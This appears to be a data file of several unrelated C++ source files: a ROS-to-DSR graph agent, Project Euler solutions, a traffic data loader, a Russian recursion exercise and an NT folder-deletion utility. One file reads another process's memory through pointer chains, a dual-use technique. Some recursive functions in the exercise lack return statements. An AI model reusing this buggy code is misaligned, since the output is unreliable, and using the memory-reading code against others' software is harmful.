    "// Copyright (c) 2023 Alberto J. Tudela Rold\u00e1n\r\n// Copyright (c) 2023 Grupo Avispa, DTE, Universidad de M\u00e1laga\r\n//\r\n// Licensed under the Apache License, Version 2.0 (the \"License\");\r\n// you may not use this file except in compliance with the License.\r\n// You may obtain a copy of the License at\r\n//\r\n//     http://www.apache.org/licenses/LICENSE-2.0\r\n//\r\n// Unless required by applicable law or agreed to in writing, software\r\n// distributed under the License is distributed on an \"AS IS\" BASIS,\r\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n// See the License for the specific language governing permissions and\r\n// limitations under the License.\r\n\r\n// C++\r\n#include <chrono>\r\n#include <thread>\r\n\r\n// ROS\r\n#include \"rosidl_typesupport_cpp/message_type_support.hpp\"\r\n#include \"sensor_msgs/msg/battery_state.hpp\"\r\n#include \"sensor_msgs/msg/image.hpp\"\r\n#include \"sensor_msgs/image_encodings.hpp\"\r\n#include \"sensor_msgs/msg/laser_scan.hpp\"\r\n\r\n// DSR\r\n#include \"dsr_util/qt_executor.hpp\"\r\n#include \"dsr_agents/topic_agent.hpp\"\r\n\r\nnamespace dsr_agents\r\n{\r\n\r\nTopicAgent::TopicAgent()\r\n: dsr_util::AgentNode(\"generic_agent\")\r\n{\r\n  // Get ROS parameters\r\n  get_params();\r\n\r\n  // Wait until the DSR graph is ready\r\n  std::this_thread::sleep_for(std::chrono::milliseconds(1000));\r\n\r\n  // Subscriber to the topic with a generic subscription\r\n  auto data = rclcpp::Node::get_topic_names_and_types();\r\n  for (auto type : data[ros_topic_]) {\r\n    generic_sub_ = create_generic_subscription(\r\n      ros_topic_, type, rclcpp::QoS(rclcpp::SystemDefaultsQoS()),\r\n      std::bind(&TopicAgent::serial_callback, this, std::placeholders::_1));\r\n  }\r\n}\r\n\r\n/* Initialize ROS parameters */\r\nvoid TopicAgent::get_params()\r\n{\r\n  // ROS parameters\r\n  declare_parameter_if_not_declared(\r\n    this, \"ros_topic\",\r\n    rclcpp::ParameterValue(\"\"), rcl_interfaces::msg::ParameterDescriptor()\r\n    .set__description(\"The ROS topic to subscribe to\"));\r\n  this->get_parameter(\"ros_topic\", ros_topic_);\r\n  RCLCPP_INFO(\r\n    this->get_logger(),\r\n    \"The parameter ros_topic is set to: [%s]\", ros_topic_.c_str());\r\n\r\n  // DSR parameters\r\n  declare_parameter_if_not_declared(\r\n    this, \"dsr_node_name\",\r\n    rclcpp::ParameterValue(\"\"), rcl_interfaces::msg::ParameterDescriptor()\r\n    .set__description(\"The name of the node in the DSR graph\"));\r\n  this->get_parameter(\"dsr_node_name\", dsr_node_name_);\r\n  RCLCPP_INFO(\r\n    this->get_logger(),\r\n    \"The parameter dsr_node is set to: [%s]\", dsr_node_name_.c_str());\r\n\r\n  declare_parameter_if_not_declared(\r\n    this, \"dsr_parent_node_name\",\r\n    rclcpp::ParameterValue(\"\"), rcl_interfaces::msg::ParameterDescriptor()\r\n    .set__description(\"The name of the parent node in the DSR graph\"));\r\n  this->get_parameter(\"dsr_parent_node_name\", dsr_parent_node_name_);\r\n  RCLCPP_INFO(\r\n    this->get_logger(),\r\n    \"The parameter dsr_parent_node_name is set to: [%s]\", dsr_parent_node_name_.c_str());\r\n\r\n  // Default DSR node name to ROS topic\r\n  dsr_node_name_ = dsr_node_name_.empty() ? ros_topic_ : dsr_node_name_;\r\n}\r\n\r\ntemplate<typename ROS_TYPE, typename NODE_TYPE, typename EDGE_TYPE>\r\nvoid TopicAgent::deserialize_and_update_attributes(\r\n  const std::shared_ptr<rclcpp::SerializedMessage> msg,\r\n  const std::string & node_name, const std::string & parent_name)\r\n{\r\n  // Deserialize a message to ROS_TYPE\r\n  ROS_TYPE ros_msg;\r\n  auto serializer = rclcpp::Serialization<ROS_TYPE>();\r\n  serializer.deserialize_message(msg.get(), &ros_msg);\r\n\r\n  // If the parent name is empty, the parent is the frame_id of the ROS message\r\n  auto new_parent_name = parent_name.empty() ? ros_msg.header.frame_id : parent_name;\r\n\r\n  // Add the node with the edge if the node does not exist\r\n  if (auto dsr_node = G_->get_node(node_name); !dsr_node.has_value()) {\r\n    add_node_with_edge<NODE_TYPE, EDGE_TYPE>(node_name, new_parent_name);\r\n  }\r\n\r\n  // Update the attributes of the node only if its priority is 0\r\n  if (auto dsr_node = G_->get_node(node_name); dsr_node.has_value()) {\r\n    if (G_->get_priority(dsr_node.value()) == 0) {\r\n      modify_attributes<ROS_TYPE>(dsr_node, ros_msg);\r\n      G_->update_node(dsr_node.value());\r\n    }\r\n  }\r\n}\r\n\r\nvoid TopicAgent::serial_callback(const std::shared_ptr<rclcpp::SerializedMessage> msg)\r\n{\r\n  // In order to deserialize the message we have to manually create a ROS2\r\n  // message in which we want to convert the serialized data.\r\n  auto data = rclcpp::Node::get_topic_names_and_types();\r\n  const std::string topic_type = data[ros_topic_][0];\r\n  RCLCPP_INFO_ONCE(\r\n    this->get_logger(), \"Subscribed to topic [%s] of type [%s]\",\r\n    ros_topic_.c_str(), topic_type.c_str());\r\n\r\n  // TODO(ajtudela): Replace 'has_edge_type' to a type according to (sensor, actuator, etc)\r\n  if (topic_type == \"sensor_msgs/msg/BatteryState\") {\r\n    deserialize_and_update_attributes\r\n    <sensor_msgs::msg::BatteryState, battery_node_type, has_edge_type>(\r\n      msg, dsr_node_name_, dsr_parent_node_name_);\r\n  } else if (topic_type == \"sensor_msg",
    "#include <iostream>\r\n\r\nint fibonnacciEvenSum() {\r\n\r\n    int firstVal = 1;\r\n    int secondVal = 1;\r\n    int sum = 0;\r\n\r\n    while (secondVal <= 4000000) {\r\n        secondVal = secondVal + firstVal;\r\n        firstVal = secondVal - firstVal;\r\n        if (secondVal % 2 == 0) {\r\n            sum += secondVal;\r\n        }\r\n    }\r\n\r\n    return sum;\r\n}\r\n\r\nlong double factorial(int num) {\r\n    return ((num <= 1) ? 1 : (factorial(num - 1) * num));\r\n}\r\n\r\nlong double latticePaths(int x, int y) {\r\n    return factorial(x + y) / factorial(x) / factorial(y);\r\n}\r\n\r\nconst unsigned int coins[] = { 1, 2, 5, 10, 20, 50, 100, 200 };\r\n\r\nint coinCombinations(int amount, int size) {\r\n \r\n    int count = 0;\r\n\r\n    if (amount > 0) {\r\n        if (size >= 0 && amount >= coins[size])\r\n            count += coinCombinations(amount - coins[size], size);\r\n        if (size > 0)\r\n            count += coinCombinations(amount, size - 1);\r\n    }\r\n    else if (amount == 0)\r\n        count++;\r\n    \r\n    return count;\r\n}\r\n\r\n\r\n\r\nint main() {\r\n\r\n    int answer2 = fibonnacciEvenSum();\r\n    std::cout << \"The answer to Question 2: \\n\\\"By considering the terms in the Fibonacci sequence whose values do not exceed four million, find the sum of the even-valued terms.\\\"\\n Is: \" << answer2 << std::endl;\r\n\r\n    long double answer15 = latticePaths(20, 20);\r\n    std::cout << \"\\nThe answer to Question 15: \\n\\\"How many such routes are there through a grid?\\\"\\n Is: \" << answer15 << std::endl;\r\n\r\n    int totalAmount = 200, largestSize = 0;\r\n    for (largestSize = 7; coins[largestSize] > totalAmount && largestSize >= 0; largestSize--);\r\n    int answer31 = coinCombinations(totalAmount, largestSize);\r\n    std::cout << \"\\nThe answer to Question 31: \\n\\\"How many different ways can 2 Pounds be made using any number of coins?\\\"\\n Is: \" << answer31 << std::endl;\r\n\r\n\r\n\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"DataProcessor.h\"\n#include <fstream>\n#include <sstream>\n#include <iostream>\n#include <filesystem>\n\nnamespace TrafficAssignment {\n\n  bool DataProcessor::LoadNet(const std::filesystem::path& net_file_path) {\n    std::ifstream file(net_file_path);\n    std::string line;\n\n\n    if (file.is_open()) {\n      // Reading metadata\n\n      std::getline(file, line);\n      std::stringstream metadata_ss(line);\n\n      int vertices, links;\n      std::string temp;\n\n      if (line[0] == '#') {\n        std::getline(metadata_ss, temp, ':'); // Skipping \"# NUMBER OF ZONES:\"    \n        std::getline(metadata_ss, temp, ','); number_of_zones_ = std::stoi(temp);\n        std::getline(metadata_ss, temp, ':'); // Skipping \"NUMBER OF NODES:\"\n        std::getline(metadata_ss, temp, ','); number_of_nodes_ = std::stoi(temp);\n        std::getline(metadata_ss, temp, ':'); // Skipping \"NUMBER OF LINKS:\"\n        std::getline(metadata_ss, temp); number_of_links_ = std::stoi(temp);\n      }\n      //std::cout << number_of_zones_ << ' ' << number_of_nodes_ << ' ' << number_of_links_ << '\\n';\n\n      links_.clear();\n      std::getline(file, line);\n      // Reading links information\n      while (std::getline(file, line)) {\n        std::stringstream ss(line);\n        int init, term, type;\n        long double capacity, length, free_flow_time, b, power, speed, toll;\n        std::string temp;\n\n        std::getline(ss, temp, ','); init = std::stoi(temp) - 1;\n        std::getline(ss, temp, ','); term = std::stoi(temp) - 1;\n        std::getline(ss, temp, ','); capacity = std::stod(temp);\n        std::getline(ss, temp, ','); length = std::stod(temp);\n        std::getline(ss, temp, ','); free_flow_time = std::stod(temp);\n        std::getline(ss, temp, ','); b = std::stod(temp);\n        std::getline(ss, temp, ','); power = std::stod(temp);\n        std::getline(ss, temp, ','); speed = std::stod(temp);\n        std::getline(ss, temp, ','); toll = std::stod(temp);\n        std::getline(ss, temp); type = std::stoi(temp);\n\n        links_.emplace_back(init, term, capacity, length, free_flow_time, b, power, speed, toll, type);\n\n        //std::cout << init << ' ' << term << ' ' << capacity << ' ' << length << ' ' << free_flow_time << ' ' << b << ' ' << power << ' ' << speed << ' ' << toll << ' ' << type << '\\n';\n      }\n\n      file.close();\n      return true;\n    }\n    else {\n      std::cerr << \"Unable to open file: \" << net_file_path << std::endl;\n      return false;\n    }\n  }\n\n  bool DataProcessor::LoadTrips(const std::filesystem::path& trips_file_path) {\n    std::ifstream file(trips_file_path);\n    std::string line;\n\n    if (file.is_open()) {\n      // Reading metadata\n      std::getline(file, line);\n      std::stringstream metadata_ss(line);\n      std::string temp;\n\n      if (line[0] == '#') {\n        std::getline(metadata_ss, temp, ':'); // Skipping \"# NUMBER OF ZONES:\"\n        std::getline(metadata_ss, temp); number_of_zones_ = std::stoi(temp);\n      }\n\n      trips_.clear();\n\n      trips_.resize(number_of_zones_);\n      for (int i = 0; i < number_of_zones_; i++) {\n        trips_[i].resize(number_of_zones_, 0);\n\n        std::getline(file, line);\n        std::stringstream ss(line);\n        std::string temp;\n        long double demand;\n        for (int j = 0; j < number_of_zones_ - 1; j++) {\n          std::getline(ss, temp, ','); demand = std::stod(temp);\n          trips_[i][j] = demand;\n        }\n        std::getline(ss, temp); demand = std::stod(temp);\n        trips_[i][number_of_zones_ - 1] = demand;\n      }\n\n      file.close();\n      return true;\n    }\n    else {\n      std::cerr << \"Unable to open file: \" << trips_file_path << std::endl;\n      return false;\n    }\n\n    trips_.clear();\n  }\n\n  bool DataProcessor::LoadData(const std::string& dataset_name) {\n    std::filesystem::path current_path = std::filesystem::current_path();\n\n    while (current_path.filename() != \"out\") {\n      current_path = current_path.parent_path();\n    }\n    current_path = current_path.parent_path() / \"TrafficAssignmentApproaches\";\n    auto net_file_path = current_path / \"data/\" / dataset_name / (dataset_name + \"_net.csv\");\n    auto trips_file_path = current_path / \"data/\" / dataset_name / (dataset_name + \"_trips.csv\");\n\n    LoadNet(net_file_path);\n    LoadTrips(trips_file_path);\n    return true;\n  }\n}",
    "#include \"misc.h\"\n\nDWORD GetProcessID(const std::wstring& processName) {\n    PROCESSENTRY32 processEntry;\n    processEntry.dwSize = sizeof(PROCESSENTRY32);\n\n    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (Process32First(snapshot, &processEntry)) {\n        do {\n            if (processName == processEntry.szExeFile) {\n                DWORD processID = processEntry.th32ProcessID;\n                CloseHandle(snapshot);\n                return processID;\n            }\n        } while (Process32Next(snapshot, &processEntry));\n    }\n\n    CloseHandle(snapshot);\n    return 0;\n}\n\nuintptr_t GetModuleBaseAddress(DWORD processID, const std::wstring& moduleName) {\n    MODULEENTRY32 moduleEntry;\n    moduleEntry.dwSize = sizeof(MODULEENTRY32);\n\n    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processID);\n    if (Module32First(snapshot, &moduleEntry)) {\n        do {\n            if (moduleName == moduleEntry.szModule) {\n                uintptr_t baseAddress = (uintptr_t)moduleEntry.modBaseAddr;\n                CloseHandle(snapshot);\n                return baseAddress;\n            }\n        } while (Module32Next(snapshot, &moduleEntry));\n    }\n\n    CloseHandle(snapshot);\n    return 0;\n}\n\nuintptr_t ResolvePointerChain(HANDLE processHandle, uintptr_t baseAddress, const std::vector<uintptr_t>& offsets) {\n    uintptr_t currentAddress = baseAddress;\n    for (const auto& offset : offsets) {\n        if (!ReadProcessMemory(processHandle, (LPCVOID)currentAddress, &currentAddress, sizeof(currentAddress), nullptr)) {\n            return 0;\n        }\n        currentAddress += offset;\n    }\n    return currentAddress;\n}\n\nvoid getDemoPath() {\n    std::filesystem::path exec_path = std::filesystem::current_path();\n    std::cout << \"Current path: \" << exec_path << std::endl;\n\n    /*auto now = std::chrono::system_clock::now();\n    std::time_t now_c = std::chrono::system_clock::to_time_t(now);\n    std::tm local_time = *std::localtime(&now_c);*/\n\n    //std::ostringstream folder_name;\n    //folder_name << std::put_time(&local_time_s, \"%Y-%m-%d_%H-%M\");\n\n    /*std::filesystem::path new_folder = exec_path / folder_name.str();\n    if (std::filesystem::create_directory(new_folder)) {\n        std::cout << \"Directory created: \" << new_folder << std::endl;\n    }\n    else {\n        std::cerr << \"Failed to create directory.\" << std::endl;\n    }*/\n}\n",
    "\ufeff#include <iostream>\n#include<string>\n\nvoid recursion(int a);\n\nstd::string palindrom(const std::string & userString);\nint mirrorValue(int value, int razryad);\nint rightToLeftDigits(int value);\nint preciseTwo(double value);\nint sumOfDigit(int value);\nint fibonacci(int position);\n\n\nint main()\n{\n    setlocale(LC_ALL, \"rus\");\n    recursion(10);\n\n    std::cout << \"\\n\u0427\u0438\u0441\u043b\u043e \u0424\u0438\u0431\u043e\u043d\u0430\u0447\u0447\u0438 \" << fibonacci(10) << '\\n';\n\n    /*4. \u0421\u0443\u043c\u043c\u0430 \u0446\u0438\u0444\u0440 \u0447\u0438\u0441\u043b\u0430.\n        \u0414\u0430\u043d\u043e \u043d\u0430\u0442\u0443\u0440\u0430\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e N.\u0412\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u0435 \u0441\u0443\u043c\u043c\u0443 \u0435\u0433\u043e \u0446\u0438\u0444\u0440.\n\n        \u0412\u0432\u043e\u0434: 179\n        \u0412\u044b\u0432\u043e\u0434 : 17*/\n    std::cout << \"\\n\u0421\u0443\u043c\u043c\u0430 \u0446\u0438\u0444\u0440 \u0447\u0438\u0441\u043b\u0430 179 \u0440\u0430\u0432\u043d\u0430 \" << sumOfDigit(111) << '\\n';\n\n    /*3. \u0422\u043e\u0447\u043d\u0430\u044f \u0441\u0442\u0435\u043f\u0435\u043d\u044c \u0434\u0432\u043e\u0439\u043a\u0438.\n        \u0414\u0430\u043d\u043e \u043d\u0430\u0442\u0443\u0440\u0430\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e N.\u0412\u044b\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u043b\u043e\u0432\u043e YES, \u0435\u0441\u043b\u0438 \u0447\u0438\u0441\u043b\u043e N \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0442\u043e\u0447\u043d\u043e\u0439 \u0441\u0442\u0435\u043f\u0435\u043d\u044c\u044e \u0434\u0432\u043e\u0439\u043a\u0438, \u0438\u043b\u0438 \u0441\u043b\u043e\u0432\u043e NO \u0432 \u043f\u0440\u043e\u0442\u0438\u0432\u043d\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435.*/\n    double userValue{ 0 };\n    std::cout << \"\\n\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e ->\";\n    std::cin >> userValue;\n\n    if(preciseTwo(userValue) == 1)\n        std::cout << \"\u0447\u0438\u0441\u043b\u043e \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0442\u043e\u0447\u043d\u043e\u0439 \u0441\u0442\u0435\u043f\u0435\u043d\u044c\u044e \u0434\u0432\u043e\u0439\u043a\u0438\\n\";\n    else\n        std::cout << \"\u0447\u0438\u0441\u043b\u043e \u043d\u0435 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0442\u043e\u0447\u043d\u043e\u0439 \u0441\u0442\u0435\u043f\u0435\u043d\u044c\u044e \u0434\u0432\u043e\u0439\u043a\u0438\\n\";\n\n    /*5. \u0426\u0438\u0444\u0440\u044b \u0447\u0438\u0441\u043b\u0430 \u0441\u043f\u0440\u0430\u0432\u0430 \u043d\u0430\u043b\u0435\u0432\u043e.\n        \u0414\u0430\u043d\u043e \u043d\u0430\u0442\u0443\u0440\u0430\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e N.\u0412\u044b\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0441\u0435 \u0435\u0433\u043e \u0446\u0438\u0444\u0440\u044b \u043f\u043e \u043e\u0434\u043d\u043e\u0439, \u0432 \u043e\u0431\u0440\u0430\u0442\u043d\u043e\u043c \u043f\u043e\u0440\u044f\u0434\u043a\u0435, \u0440\u0430\u0437\u0434\u0435\u043b\u044f\u044f \u0438\u0445 \u043f\u0440\u043e\u0431\u0435\u043b\u0430\u043c\u0438.*/\n\n    int value = 159;\n    std::cout << \"\u041e\u0431\u0440\u0430\u0442\u043d\u044b\u0439 \u043f\u043e\u0440\u044f\u0434\u043e\u043a \u0446\u0438\u0444\u0440 \u0447\u0438\u0441\u043b\u0430 \" << value << \" -> \";\n    std::cout << rightToLeftDigits(value)<<\"\\n\\n\";\n\n    /*7. \u0420\u0430\u0437\u0432\u043e\u0440\u043e\u0442 \u0447\u0438\u0441\u043b\u0430.\n        \u0414\u0430\u043d\u043e \u0447\u0438\u0441\u043b\u043e n, \u0434\u0435\u0441\u044f\u0442\u0438\u0447\u043d\u0430\u044f \u0437\u0430\u043f\u0438\u0441\u044c \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u043d\u0435 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043d\u0443\u043b\u0435\u0439.\n        \u041f\u043e\u043b\u0443\u0447\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e, \u0437\u0430\u043f\u0438\u0441\u0430\u043d\u043d\u043e\u0435 \u0442\u0435\u043c\u0438 \u0436\u0435 \u0446\u0438\u0444\u0440\u0430\u043c\u0438, \u043d\u043e \u0432 \u043f\u0440\u043e\u0442\u0438\u0432\u043e\u043f\u043e\u043b\u043e\u0436\u043d\u043e\u043c \u043f\u043e\u0440\u044f\u0434\u043a\u0435.\n        \u041f\u0440\u0438 \u0440\u0435\u0448\u0435\u043d\u0438\u0438 \u044d\u0442\u043e\u0439 \u0437\u0430\u0434\u0430\u0447\u0438 \u043d\u0435\u043b\u044c\u0437\u044f \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0446\u0438\u043a\u043b\u044b, \u0441\u0442\u0440\u043e\u043a\u0438, \u0441\u043f\u0438\u0441\u043a\u0438, \u043c\u0430\u0441\u0441\u0438\u0432\u044b, \u0440\u0430\u0437\u0440\u0435\u0448\u0430\u0435\u0442\u0441\u044f \u0442\u043e\u043b\u044c\u043a\u043e \u0440\u0435\u043a\u0443\u0440\u0441\u0438\u044f \u0438 \u0446\u0435\u043b\u043e\u0447\u0438\u0441\u043b\u0435\u043d\u043d\u0430\u044f \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u043a\u0430.\n        \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043e\u043b\u0436\u043d\u0430 \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0442\u044c \u0446\u0435\u043b\u043e\u0435 \u0447\u0438\u0441\u043b\u043e, \u044f\u0432\u043b\u044f\u044e\u0449\u0435\u0435\u0441\u044f \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u043c \u0440\u0430\u0431\u043e\u0442\u044b \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b, \u0432\u044b\u0432\u043e\u0434\u0438\u0442\u044c \u0447\u0438\u0441\u043b\u043e \u043f\u043e \u043e\u0434\u043d\u043e\u0439 \u0446\u0438\u0444\u0440\u0435 \u043d\u0435\u043b\u044c\u0437\u044f.*/\n    value = 951;\n    std::cout << \"\u0420\u0430\u0437\u0432\u0435\u0440\u043d\u0443 \u0447\u0438\u0441\u043b\u043e \" << value<<' ';\n    std::cout << mirrorValue(value, 0)<<'\\n';\n\n    /*8. \u041f\u0430\u043b\u0438\u043d\u0434\u0440\u043e\u043c.\n        \u0414\u0430\u043d\u043e \u0441\u043b\u043e\u0432\u043e, \u0441\u043e\u0441\u0442\u043e\u044f\u0449\u0435\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0438\u0437 \u0441\u0442\u0440\u043e\u0447\u043d\u044b\u0445 \u043b\u0430\u0442\u0438\u043d\u0441\u043a\u0438\u0445 \u0431\u0443\u043a\u0432.\u041f\u0440\u043e\u0432\u0435\u0440\u044c\u0442\u0435, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u044d\u0442\u043e \u0441\u043b\u043e\u0432\u043e \u043f\u0430\u043b\u0438\u043d\u0434\u0440\u043e\u043c\u043e\u043c.\u0412\u044b\u0432\u0435\u0434\u0438\u0442\u0435 YES \u0438\u043b\u0438 NO.\n        \u041f\u0440\u0438 \u0440\u0435\u0448\u0435\u043d\u0438\u0438 \u044d\u0442\u043e\u0439 \u0437\u0430\u0434\u0430\u0447\u0438 \u043d\u0435\u043b\u044c\u0437\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u0446\u0438\u043a\u043b\u0430\u043c\u0438.*/\n    \n    std::string str{ \"1213321\" };\n    std::cout << palindrom(str) << '\\n';\n\n\n    return 0;\n}\n\nstd::string palindrom(const std::string & str)\n{\n    if(str.length() == 1)\n        return \"Yes\";\n    \n    else {\n        \n        if(str.substr(0, 1)._Equal(str.substr(str.length() - 1, str.length()))) {\n            \n            if(str.length() == 2) {\n                return \"yes\";\n            }\n\n            return palindrom(str.substr(1, str.length() - 2));\n        } \n        \n        else {\n            return \"NO\";\n        }\n    }\n}\n\nint mirrorValue(int value, int razryad)\n{\n    if(value == 0)\n        return razryad;\n\n    else\n        mirrorValue(value / 10, razryad * 10 + value % 10);\n}\n\nint rightToLeftDigits(int value)\n{\n    if(value < 10)\n        return value;\n\n    else {\n        std::cout << value % 10 << ' ';\n        return rightToLeftDigits(value / 10);\n    }\n}\n\nint preciseTwo(double value)\n{\n    if(value == 1)\n        return 1;\n\n    else if(value > 1 && value < 2)\n        return 0;\n\n    else\n        preciseTwo(value / 2);\n}\n\nint sumOfDigit(int value)\n{\n    if(value < 10)\n        return value;\n\n    else\n        return sumOfDigit(value / 10) + value % 10;\n}\n\nint fibonacci(int position)//\u0440\u0435\u043a\u0443\u0440\u0441\u0438\u0432\u043d\u044b\u0439 \u0444\u0438\u0431\u043e\u043d\u0430\u0447\u0447\u0438\n{\n\n    if(position == 0 || position == 1)\n        return position;\n\n    else\n        return fibonacci(position - 1) + fibonacci(position - 2);\n\n\n}\n\n//\u0432\u044b\u0432\u043e\u0436\u0443 \u0447\u0438\u0441\u043b\u0430 \u0432 \u043e\u0431\u0440\u0430\u0442\u043d\u043e\u043c \u043f\u043f\u043e\u0440\u044f\u0434\u043a\u0435\nvoid recursion(int a)\n{\n    if(a < 0) {\n        return;\n    }\n    std::cout << a << ' ';\n    recursion(~0 + a);\n\n}",
    "#include \"stdafx.h\"\n\n#include \"io.h\"\n#include \"task.h\"\n\n#define FILE_SHARE_VALID_FLAGS (FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)\n\nvoid Task::SetFailPath(POBJECT_ATTRIBUTES poa)\n{\n\tULONG cb = 0x10000;\n\n\tif (PVOID buf = LocalAlloc(LMEM_FIXED, cb))\n\t{\n\t\tunion {\n\t\t\tPVOID pv;\n\t\t\tPWSTR psz;\n\t\t\tPFILE_NAME_INFORMATION pfni;\n\t\t\tPBYTE pb;\n\t\t};\n\n\t\tpv = buf;\n\n\t\tif (poa->RootDirectory)\n\t\t{\n\t\t\tIO_STATUS_BLOCK iosb;\n\t\t\tif (0 <= NtQueryInformationFile(poa->RootDirectory, &iosb, pfni, MINSHORT*sizeof(WCHAR), FileNameInformation))\n\t\t\t{\n\t\t\t\tULONG FileNameLength = pfni->FileNameLength;\n\t\t\t\tmemcpy(psz, pfni->FileName, FileNameLength);\n\n\t\t\t\tpb += FileNameLength;\n\t\t\t\tif (sizeof(WCHAR) < (cb -= FileNameLength))\n\t\t\t\t{\n\t\t\t\t\t*psz++ = '\\\\';\n\t\t\t\t\tcb -= sizeof(WCHAR);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (cb >>= 1)\n\t\t{\n\t\t\tif (poa->ObjectName)\n\t\t\t{\n\t\t\t\tswprintf_s(psz, cb, L\"%wZ\", poa->ObjectName);\n\t\t\t}\n\t\t}\n\n\t\tif (pv = InterlockedExchangePointer((void**)&_M_FailPath, buf))\n\t\t{\n\t\t\tdelete [] psz;\n\t\t}\n\t}\n}\n\nNTSTATUS SetDelete(HANDLE hFile)\n{\n\tstatic const FILE_DISPOSITION_INFO_EX fdi = {\n\t\tFILE_DISPOSITION_FLAG_DELETE|FILE_DISPOSITION_FLAG_POSIX_SEMANTICS\n\t};\n\tIO_STATUS_BLOCK iosb;\n\n\tswitch (NTSTATUS status = NtSetInformationFile(hFile, &iosb, (void*)&fdi, sizeof(fdi), FileDispositionInformationEx))\n\t{\n\tcase STATUS_INVALID_PARAMETER:\n\t\treturn NtSetInformationFile(hFile, &iosb, (void*)&fdi, sizeof(fdi), FileDispositionInformation);\n\tdefault: return status;\n\t}\n}\n\nclass __declspec(align(__alignof(SLIST_ENTRY))) CFolder : public IO_OBJECT\n{\n\tenum { er = 'LLLL' };\n\n\tinline static ULONG _S_n;\n\tinline static SLIST_HEADER _S_Head;\n\tinline static PVOID _S_pFolders = 0;\n\n\tTask* _M_pTask;\n\tCFolder* _M_parent;\n\tLONG _M_Files = 1;\n\tULONG _M_nLevel;\n\tULONG _M_hash;\n\tBOOL _M_bDelete;\n\tunion {\n\t\tFILE_DIRECTORY_INFORMATION _M_fdi[];\n\t\tUCHAR _M_buf[0x1000];\n\t};\n\n\tvoid DecFiles()\n\t{\n\t\tif (!InterlockedDecrement(&_M_Files))\n\t\t{\n\t\t\tInterlockedIncrementNoFence(&_M_pTask->_M_nDeletedFolders);\n\t\t\tif (0 > _M_bDelete)\n\t\t\t{\n\t\t\t\tSetDelete(getHandle());\n\t\t\t}\n\t\t\tClose();\n\t\t\tif (_M_parent)\n\t\t\t{\n\t\t\t\t_M_parent->DecFiles();\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid IncFiles()\n\t{\n\t\tInterlockedIncrementNoFence(&_M_Files);\n\t}\n\n\tvoid Process(PFILE_DIRECTORY_INFORMATION pfdi)\n\t{\n\t\tTask* pTask = _M_pTask;\n\t\tBOOL bDelete = _M_bDelete;\n\n\t\tULONG NextEntryOffset = 0;\n\n\t\tUNICODE_STRING ObjectName;\n\t\tOBJECT_ATTRIBUTES oa = { sizeof(oa), getHandle(), &ObjectName, OBJ_CASE_INSENSITIVE };\n\t\t\n\t\tdo \n\t\t{\n\t\t\tif (pTask->_M_bCancelled)\n\t\t\t{\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\t(ULONG_PTR&)pfdi += NextEntryOffset;\n\n\t\t\tswitch (pfdi->FileNameLength)\n\t\t\t{\n\t\t\tcase 2*sizeof(WCHAR):\n\t\t\t\tif ('.' != pfdi->FileName[1]) break;\n\t\t\tcase sizeof(WCHAR):\n\t\t\t\tif ('.' == pfdi->FileName[0]) continue;\n\t\t\t}\n\n\t\t\tObjectName.MaximumLength = ObjectName.Length = (USHORT)pfdi->FileNameLength;\n\t\t\tObjectName.Buffer = pfdi->FileName;\n\n\t\t\tHANDLE hFile;\n\t\t\tIO_STATUS_BLOCK iosb;\n\n\t\t\tif (bDelete)\n\t\t\t{\n\t\t\t\tif (FILE_ATTRIBUTE_READONLY & pfdi->FileAttributes)\n\t\t\t\t{\n\t\t\t\t\tif (0 <= NtOpenFile(&hFile, FILE_WRITE_ATTRIBUTES, &oa, &iosb, FILE_SHARE_VALID_FLAGS, \n\t\t\t\t\t\tFILE_OPEN_FOR_BACKUP_INTENT|FILE_OPEN_REPARSE_POINT))\n\t\t\t\t\t{\n\t\t\t\t\t\tstatic FILE_BASIC_INFORMATION fbi = { {}, {}, {}, {}, FILE_ATTRIBUTE_NORMAL };\n\t\t\t\t\t\tNtSetInformationFile(hFile, &iosb, &fbi, sizeof(fbi), FileBasicInformation);\n\t\t\t\t\t\tNtClose(hFile);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (FILE_ATTRIBUTE_DIRECTORY & pfdi->FileAttributes)\n\t\t\t{\n\t\t\t\tInterlockedIncrementNoFence(&pTask->_M_Folders);\n\n\t\t\t\tif (CFolder* p = new CFolder(pTask, this, bDelete, _M_nLevel + 